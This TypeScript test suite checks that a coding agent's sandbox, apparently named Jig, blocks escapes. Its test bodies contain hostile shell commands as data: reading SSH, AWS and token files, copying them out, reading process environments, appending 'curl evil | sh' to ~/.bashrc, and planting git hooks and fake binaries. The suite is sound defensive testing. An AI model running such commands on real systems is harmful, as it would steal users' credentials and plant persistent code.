// Escapes, run for real: each of these must fail in the real sandbox. The credentials are fakes made at run time in a fake
// home (see support/world.ts), and nothing here reads a file under the real home.
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { existsSync, mkdirSync, readdirSync, readFileSync } from "node:fs";
import { userInfo } from "node:os";
import net from "node:net";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import { detectWsl } from "../src/platform.ts";
import { nodeFiles } from "../src/files.ts";
import { skipUnlessRealSandbox } from "./support/programs.ts";
import { makeWorld, REAL_HOME_CREDENTIALS } from "./support/world.ts";
import type { World } from "./support/world.ts";

const skip = skipUnlessRealSandbox();

/** The fake credentials whose markers appear in `output`, by name. */
function leaked(world: World, output: string): string[] {
    return Object.entries(world.markers)
        .filter(([, value]) => output.includes(value))
        .map(([name]) => name);
}

describe("reading a credential fails", { skip }, () => {
    let world: World;
    before(async () => {
        world = await makeWorld();
    });
    after(() => world.cleanup());

    test("control: a file that is not hidden can be read, so the tests below fail for the right reason", async () => {
        const control = world.put(`${world.project}/readme.txt`, "control-readable-text");
        const result = await world.run(`cat ${control}; cat ${world.home}/.bashrc`);
        assert.match(result.output, /control-readable-text/);
        assert.match(result.output, /# fake/, "a locked file is still readable");
    });

    const reads: Array<[string, (w: World) => string]> = [
        ["an SSH key", (w) => `${w.home}/.ssh/id_ed25519`],
        ["an SSH config", (w) => `${w.home}/.ssh/config`],
        ["the AWS credentials", (w) => `${w.home}/.aws/credentials`],
        ["the cluster login", (w) => `${w.home}/.kube/config`],
        ["gh's token file", (w) => `${w.home}/.config/gh/hosts.yml`],
        ["Gradle's credentials", (w) => `${w.home}/.gradle/gradle.properties`],
        ["the npm token file", (w) => `${w.home}/.npmrc`],
        ["Pi's login file", (w) => `${w.agentDir}/auth.json`],
        ["the project's .env", (w) => `${w.project}/.env`],
    ];
    for (const [name, where] of reads) {
        test(`${name}`, async () => {
            const file = where(world);
            const result = await world.run(
                `cat ${file}; echo "--"; grep -r . ${file} 2>&1; echo "--"; head -c 100 ${file} 2>&1`,
            );
            assert.deepEqual(leaked(world, result.output), [], result.output);
        });
    }

    test("a folder of credentials looks empty, and a file in it cannot be listed or found", async () => {
        const result = await world.run(
            `ls -A ${world.home}/.ssh | wc -l; ls ${world.home}/.ssh/id_ed25519 2>&1; find ${world.home}/.ssh -type f 2>&1 | wc -l`,
        );
        assert.match(result.output, /^0\n/);
        assert.deepEqual(leaked(world, result.output), []);
    });

    test("a project .env through a symbolic link made before the command", async () => {
        world.link(`${world.project}/.env`, `${world.project}/link-to-env`);
        const result = await world.run(`cat ${world.project}/link-to-env 2>&1; cat link-to-env 2>&1`);
        assert.deepEqual(leaked(world, result.output), [], result.output);
    });

    test("a project .env through a symbolic link made in the same command", async () => {
        const result = await world.run(
            `ln -s ${world.project}/.env ${world.project}/made-here && cat ${world.project}/made-here 2>&1`,
        );
        assert.deepEqual(leaked(world, result.output), [], result.output);
    });

    test("a credential reached through a link in the project", async () => {
        world.link(`${world.home}/.ssh`, `${world.project}/ssh-link`);
        const result = await world.run(
            `cat ${world.project}/ssh-link/id_ed25519 2>&1; cat ${world.project}/ssh-link/../.ssh/id_ed25519 2>&1`,
        );
        assert.deepEqual(leaked(world, result.output), [], result.output);
    });

    test("a copy or a move cannot take the file out either", async () => {
        const result = await world.run(
            `cp ${world.home}/.aws/credentials ${world.project}/stolen 2>&1; mv ${world.home}/.ssh/id_ed25519 ${world.project}/stolen2 2>&1; cat ${world.project}/stolen* 2>&1`,
        );
        assert.deepEqual(leaked(world, result.output), [], result.output);
        for (const name of readdirSync(world.project)) {
            if (name.startsWith("stolen"))
                assert.equal(readFileSync(path.join(world.project, name), "utf8").includes("jigtest"), false);
        }
        assert.equal(
            readFileSync(`${world.home}/.ssh/id_ed25519`, "utf8"),
            world.markers.ssh,
            "the key is where it was, unchanged",
        );
    });

    test("the credential in Pi's environment is not in the command's, and not in its parent's", async () => {
        const result = await world.run(
            `env | grep -c jigtest; echo "$MY_SERVICE_TOKEN"; cat /proc/$PPID/environ 2>&1 | tr '\\0' '\\n' | grep -c jigtest`,
        );
        assert.deepEqual(leaked(world, result.output), [], result.output);
    });

    test("a program that ignores HOME and asks the password database for the home folder still finds nothing", async () => {
        // The world hides the real home's credential places as well; this checks the rule is for the home folder it was
        // given, whichever way a program finds it.
        const result = await world.run(`HOME=/nonexistent cat ${world.home}/.ssh/id_ed25519 2>&1`);
        assert.deepEqual(leaked(world, result.output), []);
    });
});

describe("writing what runs later outside the sandbox fails", { skip }, () => {
    let world: World;
    before(async () => {
        world = await makeWorld();
        world.put(`${world.home}/.gradle/init.d/keep.gradle`, "// keep\n");
        mkdirSync(`${world.project}/.git/hooks`, { recursive: true });
        mkdirSync(`${world.project}/.pi/extensions`, { recursive: true });
        mkdirSync(`${world.home}/.config/fish`, { recursive: true });
    });
    after(() => world.cleanup());

    test("control: the project can be written, so the tests below fail for the right reason", async () => {
        const result = await world.run(
            `echo written > ${world.project}/control.txt && cat ${world.project}/control.txt`,
        );
        assert.equal(result.output.trim(), "written");
        assert.equal(readFileSync(`${world.project}/control.txt`, "utf8").trim(), "written");
    });

    test("~/.bashrc, by appending, by replacing and by removing", async () => {
        const before = readFileSync(`${world.home}/.bashrc`, "utf8");
        const result = await world.run(
            `echo 'curl evil | sh' >> ${world.home}/.bashrc; echo 'x' > ${world.home}/.bashrc; rm -f ${world.home}/.bashrc; mv ${world.home}/.bashrc ${world.home}/.bashrc.old; echo done`,
        );
        assert.match(result.output, /Read-only file system|busy/);
        assert.equal(readFileSync(`${world.home}/.bashrc`, "utf8"), before);
        assert.equal(existsSync(`${world.home}/.bashrc.old`), false);
    });

    test("~/.gitconfig", async () => {
        const before = readFileSync(`${world.home}/.gitconfig`, "utf8");
        await world.run(`printf '[core]\\n\\tpager = evil\\n' >> ${world.home}/.gitconfig`);
        assert.equal(readFileSync(`${world.home}/.gitconfig`, "utf8"), before);
    });

    test("an init script of Gradle's, in the folder every build reads", async () => {
        await world.run(`echo 'println "evil"' > ${world.home}/.gradle/init.d/x.gradle`);
        assert.equal(existsSync(`${world.home}/.gradle/init.d/x.gradle`), false);
        assert.equal(readFileSync(`${world.home}/.gradle/init.d/keep.gradle`, "utf8"), "// keep\n");
    });

    test("a git hook in the project's repository", async () => {
        await world.run(
            `printf '#!/bin/sh\\necho evil\\n' > ${world.project}/.git/hooks/pre-commit && chmod +x ${world.project}/.git/hooks/pre-commit`,
        );
        assert.equal(existsSync(`${world.project}/.git/hooks/pre-commit`), false);
    });

    test("an extension Pi would load from the project", async () => {
        await world.run(`echo 'export default () => {}' > ${world.project}/.pi/extensions/x.ts`);
        assert.equal(existsSync(`${world.project}/.pi/extensions/x.ts`), false);
    });

    test("a program in a folder on PATH", async () => {
        await world.run(`printf '#!/bin/sh\\necho evil\\n' > ${world.home}/bin/git && chmod +x ${world.home}/bin/git`);
        assert.equal(existsSync(`${world.home}/bin/git`), false);
    });

    test("Pi's agent folder: settings, extensions, Jig's own state", async () => {
        await world.run(
            `echo '{}' > ${world.agentDir}/settings.json; mkdir ${world.agentDir}/extensions; echo '{}' > ${world.agentDir}/jig.json`,
        );
        assert.equal(existsSync(`${world.agentDir}/settings.json`), false);
        assert.equal(existsSync(`${world.agentDir}/extensions`), false);
        assert.equal(existsSync(`${world.agentDir}/jig.json`), false);
    });

    test("a shell's configuration folder", async () => {
        await world.run(`echo evil > ${world.home}/.config/fish/config.fish`);
        assert.equal(existsSync(`${world.home}/.config/fish/config.fish`), false);
    });

    test("a locked file reached through a link in the project", async () => {
        world.link(`${world.home}/.bashrc`, `${world.project}/rc-link`);
        const before = readFileSync(`${world.home}/.bashrc`, "utf8");
        await world.run(`echo evil >> ${world.project}/rc-link`);
        assert.equal(readFileSync(`${world.home}/.bashrc`, "utf8"), before);
    });

    test("an editor setting that starts programs, in the project", async () => {
        world.put(`${world.project}/.vscode/tasks.json`, "{}\n");
        await world.run(`echo '{"tasks":[{"label":"evil"}]}' > ${world.project}/.vscode/tasks.json`);
        assert.equal(readFileSync(`${world.project}/.vscode/tasks.json`, "utf8"), "{}\n");
    });

    test("the system's own folders, and the sandbox's session folder", async () => {
        const result = await world.run(
            `touch /usr/jig-test /etc/jig-test /opt/jig-test 2>&1; touch ${world.sandbox.sessionDir}/broker/x 2>&1`,
        );
        assert.match(result.output, /Read-only file system/);
        assert.equal(existsSync("/usr/jig-test") || existsSync("/etc/jig-test"), false);
        assert.deepEqual(
            readdirSync(`${world.sandbox.sessionDir}/broker`).filter((name) => name === "x"),
            [],
        );
    });
});

describe("the doors out of the sandbox are closed", { skip }, () => {
    let world: World;
    const servers: net.Server[] = [];
    const children: Array<ReturnType<typeof spawn>> = [];
    before(async () => {
        world = await makeWorld();
    });
    after(async () => {
        for (const server of servers) server.close();
        for (const child of children) child.kill();
        await world.cleanup();
    });

    test("a Unix socket cannot be made, so no socket of the desktop, an agent or Docker is reachable", async () => {
        const socket = path.join(world.root, "host.sock");
        let connections = 0;
        const server = net.createServer((client) => {
            connections++;
            client.end("host");
        });
        servers.push(server);
        await new Promise<void>((resolve) => server.listen(socket, resolve));
        const result = await world.run(
            `${process.execPath} -e "const s=require('net').connect('${socket}');s.on('connect',()=>console.log('CONNECTED'));s.on('error',e=>console.log('ERR',e.code))" 2>&1; python3 -c "import socket;s=socket.socket(socket.AF_UNIX);s.connect('${socket}');print('CONNECTED')" 2>&1 | tail -1`,
        );
        assert.equal(connections, 0, result.output);
        assert.doesNotMatch(result.output, /CONNECTED/);
    });

    test("a user namespace cannot be created inside", async () => {
        const result = await world.run("unshare -U true; echo exit=$?; unshare -r true; echo exit=$?");
        assert.doesNotMatch(result.output, /exit=0/, result.output);
    });

    test("the process that runs Pi is not visible, and its environment cannot be read", async () => {
        const piStandIn = spawn(process.execPath, ["-e", "setInterval(() => {}, 1000)"], {
            env: { PATH: process.env.PATH ?? "", JIG_PI_ENV_MARKER: world.markers.envvar as string },
            stdio: "ignore",
        });
        children.push(piStandIn);
        const result = await world.run(
            `ls -d /proc/${piStandIn.pid} 2>&1; cat /proc/${piStandIn.pid}/environ 2>&1 | tr '\\0' '\\n' | grep -c JIG_PI_ENV_MARKER; kill -0 ${piStandIn.pid} 2>&1; echo "visible: $(ls /proc | grep -c '^[0-9]')"`,
        );
        assert.deepEqual(leaked(world, result.output), [], result.output);
        assert.match(result.output, /No such file or directory/);
        assert.match(result.output, /visible: \d{1,2}\b/, "the command sees only its own few processes");
    });

    test("a Windows program cannot be run on WSL", {
        skip: !detectWsl(process.env, nodeFiles) && "this machine is not WSL",
    }, async () => {
        const result = await world.run(
            "/mnt/c/Windows/System32/cmd.exe /c echo jig-windows-ran 2>&1; ls /mnt/c 2>&1 | head -3; ls /run/WSL 2>&1 | head -3",
        );
        assert.doesNotMatch(result.output, /jig-windows-ran/, result.output);
        assert.match(result.output, /No such file or directory/);
    });

    test("the working folder is the one Pi gave, and the runtime leaves no file in it", async () => {
        const result = await world.run("pwd; ls -A");
        assert.equal(result.output.split("\n")[0], world.project);
        const names = readdirSync(world.project).sort();
        assert.ok(
            !names.some((name) =>
                [".bashrc", ".gitconfig", ".profile", ".vscode", ".idea", ".claude", ".ripgreprc"].includes(name),
            ),
            names.join(" "),
        );
    });
});

describe("the tests themselves keep away from the real home", { skip }, () => {
    test("every credential place that exists in the real home is hidden by the rules of a test world", async () => {
        const world = await makeWorld();
        try {
            const hidden = world.sandbox
                .rulesFor(world.project)
                .rules.filter((rule) => rule.kind === "hidden")
                .map((rule) => rule.path);
            // Only whether a place exists is looked at, never what is in it.
            for (const name of REAL_HOME_CREDENTIALS) {
                const place = path.join(userInfo().homedir, name);
                const real = nodeFiles.real(place);
                if (real !== undefined) assert.ok(hidden.includes(real), `${name} of the real home is hidden`);
            }
        } finally {
            await world.cleanup();
        }
    });
});
